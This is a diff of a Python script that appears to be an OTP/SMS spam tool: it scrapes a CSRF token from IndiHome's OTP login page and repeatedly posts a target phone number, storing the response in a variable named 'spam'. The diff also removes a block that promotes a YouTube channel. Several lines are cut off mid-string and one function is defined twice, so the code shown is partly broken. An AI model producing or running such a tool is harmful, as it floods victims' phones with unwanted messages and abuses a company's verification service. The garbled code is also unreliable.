@@ -12,13 +12,6 @@ C = '\033[1;36m'
 W = '\033[1;37m'
 A = '\033[90m'
 
-
-os.system('clear')
-print(C+'Subscribe channel Ryuzora')
-sleep(2)
-print(K+'[ Opening'+M+' Youtube ]')
-sleep(1)
-os.system('xdg-open https://www.youtube.com/c/RyuzsanYT')
 os.system('clear')
 sleep(1.3)
 
@@ -26,15 +19,12 @@ def gas(no):
         s = requests.Session()
         url = "https://www.indihome.co.id/verifik>
         req = s.get(url).text
-        token = re.findall(r"name=\"_token\" valu>
-
+        token = re.findall(r"name=\"_token\" value>
         data = {
         "_token":token,
         "msisdn":no
         }
-
         spam = s.post(url, data=data).text
-
         return spam
 
 def gas(no):
@@ -42,14 +32,11 @@ def gas(no):
         url = "https://www.indihome.co.id/verifikasi-layanan/login-otp"
         req = s.get(url).text
         token = re.findall(r"name=\"_token\" value=\"(.*?)\"", req)[0]
-
         data = {
         "_token":token,
         "msisdn":no
         }
-
         spam = s.post(url, data=data).text
-
         return spam
         
 def main(cnt, no):
